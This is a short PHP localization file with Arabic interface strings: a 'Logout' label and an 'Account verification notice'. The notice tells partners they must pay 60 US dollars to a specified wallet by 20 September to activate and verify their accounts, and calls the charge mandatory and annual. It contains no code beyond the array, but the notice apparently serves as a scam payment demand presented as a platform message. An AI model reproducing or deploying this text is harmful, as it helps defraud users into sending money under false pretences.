<?php

return [
    'Logout' => 'تسجيل الخروج',
    'Account verification notice' => <<<'TEXT'
أعزائي الشركاء!

من أجل الأداء المناسب للمنصة والقدرة على معالجة جميع المدفوعات والاسترداد ، من المهم أن يكون لديك بيانات مستخدم دقيقة ومحدثة.

في هذا الصدد ، من الضروري إكمال إجراء التحقق من الحساب. يتطلب دفع 60 دولارًا أمريكيًا إلى المحفظة المحددة هنا ، وبعد ذلك سيتم تنشيط حسابك وسيتلقى النظام البيانات اللازمة للمعالجة الصحيحة للمدفوعات.

يتم توجيه هذه الأموال لدعم التشغيل المستقر للموقع والتعرف على المستخدم ، وضمان حماية الحسابات والحفاظ عليها محدثة.

يجب أن يتم الدفع بحلول 20 سبتمبر. هذا الإجراء إلزامي ويتم فرضه سنويًا.
TEXT,
];
